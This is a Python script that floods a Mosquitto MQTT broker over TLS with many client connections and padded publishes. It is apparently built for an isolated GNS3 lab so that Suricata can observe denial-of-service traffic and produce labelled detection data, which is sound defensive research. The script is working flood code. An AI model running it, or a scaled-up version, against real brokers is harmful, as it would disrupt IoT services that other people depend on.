#!/usr/bin/env python3
"""Controlled MQTT/TLS flood for the isolated GNS3 lab.

The goal is to create a bounded number of TLS sessions and publishes against
the Mosquitto broker so Suricata can observe excessive connections or traffic
volume without destabilizing the whole environment.
"""

import argparse
import json
import os
import ssl
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timezone
from pathlib import Path

import paho.mqtt.client as mqtt


def build_topic(tenant_id: str, device_id: str, message_type: str) -> str:
    return f"iot/{tenant_id}/{device_id}/{message_type}"


def pad_payload(payload: dict, target_bytes: int) -> str:
    body = json.dumps(payload, separators=(",", ":"), ensure_ascii=False)
    current_size = len(body.encode("utf-8"))
    if current_size >= target_bytes:
        return body

    payload["padding"] = "X" * max(0, target_bytes - current_size - 20)
    return json.dumps(payload, separators=(",", ":"), ensure_ascii=False)


def require_file(path: str, label: str) -> None:
    if not os.path.isfile(path):
        raise FileNotFoundError(f"{label} not found: {path}")


def make_output_dir(base_dir: str) -> Path:
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    output_dir = Path(base_dir) / timestamp
    output_dir.mkdir(parents=True, exist_ok=True)
    return output_dir


def build_client(args, client_id: str) -> mqtt.Client:
    client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311, clean_session=True)

    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile=args.ca_file)
    ctx.load_cert_chain(args.cert_file, args.key_file)

    if hasattr(ssl, "TLSVersion"):
        ctx.minimum_version = ssl.TLSVersion.TLSv1_3

    client.tls_set_context(ctx)
    client.tls_insecure_set(False)
    client.connect(args.broker_host, args.broker_port, keepalive=args.keepalive)
    client.loop_start()
    return client


def run_connection(index: int, args, topic: str, payload_text: str) -> dict:
    client_id = f"{args.client_prefix}-{index:03d}"
    result = {
        "index": index,
        "client_id": client_id,
        "status": "ok",
        "messages_sent": 0,
        "started_at": datetime.now(timezone.utc).isoformat(),
    }

    client = None
    try:
        client = build_client(args, client_id)
        for msg_index in range(args.messages_per_connection):
            info = client.publish(topic, payload_text, qos=args.qos)
            info.wait_for_publish()
            result["messages_sent"] += 1
            if args.delay_ms > 0:
                time.sleep(args.delay_ms / 1000)
        if args.hold_ms > 0:
            time.sleep(args.hold_ms / 1000)
    except Exception as exc:  # noqa: BLE001 - keep per-connection errors visible
        result["status"] = "error"
        result["error"] = str(exc)
    finally:
        if client is not None:
            try:
                client.disconnect()
                client.loop_stop()
            except Exception:
                pass
        result["finished_at"] = datetime.now(timezone.utc).isoformat()
    return result


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Bounded MQTT/TLS flood for the GNS3 PFE lab.",
    )
    parser.add_argument("--broker-host", default="192.168.20.10")
    parser.add_argument("--broker-port", type=int, default=8883)
    parser.add_argument("--device-id", default="dev_048797")
    parser.add_argument("--tenant-id", default="tt-demo")
    parser.add_argument("--message-type", default="telemetry")
    parser.add_argument("--topic", default="", help="Override the MQTT topic entirely.")
    parser.add_argument("--ca-file", default="/work/vault/certs/ca-chain.crt")
    parser.add_argument("--cert-file", default="/work/fleet-sim/certs/dev_048797/client.crt")
    parser.add_argument("--key-file", default="/work/fleet-sim/certs/dev_048797/client.key")
    parser.add_argument("--connections", type=int, default=20)
    parser.add_argument("--workers", type=int, default=5)
    parser.add_argument("--messages-per-connection", type=int, default=5)
    parser.add_argument("--payload-bytes", type=int, default=512)
    parser.add_argument("--qos", type=int, default=0, choices=[0, 1])
    parser.add_argument("--delay-ms", type=int, default=10)
    parser.add_argument("--hold-ms", type=int, default=0)
    parser.add_argument("--keepalive", type=int, default=30)
    parser.add_argument("--client-prefix", default="a1-flood")
    parser.add_argument("--output-dir", default="/work/attacks/A1-flood")
    return parser.parse_args()


def main() -> int:
    args = parse_args()

    for path, label in (
        (args.ca_file, "CA file"),
        (args.cert_file, "Client certificate"),
        (args.key_file, "Client key"),
    ):
        require_file(path, label)

    if args.workers < 1 or args.connections < 1 or args.messages_per_connection < 1:
        raise SystemExit("connections, workers and messages-per-connection must be >= 1")

    topic = args.topic or build_topic(args.tenant_id, args.device_id, args.message_type)
    payload_text = pad_payload(
        {
            "scenario": "A1-flood",
            "device_id": args.device_id,
            "tenant_id": args.tenant_id,
            "message_type": args.message_type,
            "attack_type": "dos",
            "label_secure": 0,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        },
        args.payload_bytes,
    )

    output_dir = make_output_dir(args.output_dir)
    failures = []
    results = []
    started = time.perf_counter()

    print("=== A1 Flood MQTT/TLS ===")
    print(f"Broker       : {args.broker_host}:{args.broker_port}")
    print(f"Topic        : {topic}")
    print(f"Connections  : {args.connections}")
    print(f"Workers      : {args.workers}")
    print(f"Msgs/conn    : {args.messages_per_connection}")
    print(f"Artifacts    : {output_dir}")
    print("")

    lock = threading.Lock()

    with ThreadPoolExecutor(max_workers=min(args.workers, args.connections)) as executor:
        future_map = {
            executor.submit(run_connection, index, args, topic, payload_text): index
            for index in range(1, args.connections + 1)
        }
        for future in as_completed(future_map):
            result = future.result()
            with lock:
                results.append(result)
            if result["status"] == "ok":
                print(
                    f"[{result['index']:03d}] OK  client={result['client_id']} "
                    f"messages={result['messages_sent']}"
                )
            else:
                failures.append(result)
                print(
                    f"[{result['index']:03d}] ERR client={result['client_id']} "
                    f"reason={result.get('error', 'unknown')}"
                )

    duration = time.perf_counter() - started
    summary = {
        "scenario": "A1-flood",
        "started_at": datetime.now(timezone.utc).isoformat(),
        "broker_host": args.broker_host,
        "broker_port": args.broker_port,
        "topic": topic,
        "connections": args.connections,
        "workers": args.workers,
        "messages_per_connection": args.messages_per_connection,
        "payload_bytes": args.payload_bytes,
        "duration_seconds": round(duration, 3),
        "success_connections": sum(1 for item in results if item["status"] == "ok"),
        "failed_connections": len(failures),
        "messages_sent": sum(item["messages_sent"] for item in results),
        "results_file": str(output_dir / "summary.json"),
    }

    (output_dir / "summary.json").write_text(
        json.dumps({"summary": summary, "connections": results}, indent=2),
        encoding="utf-8",
    )
    if failures:
        (output_dir / "failures.json").write_text(
            json.dumps(failures, indent=2),
            encoding="utf-8",
        )

    print("")
    print(json.dumps(summary, indent=2))
    print(f"Saved summary to {output_dir / 'summary.json'}")
    return 0 if not failures else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except FileNotFoundError as exc:
        print(f"[FATAL] {exc}")
        sys.exit(2)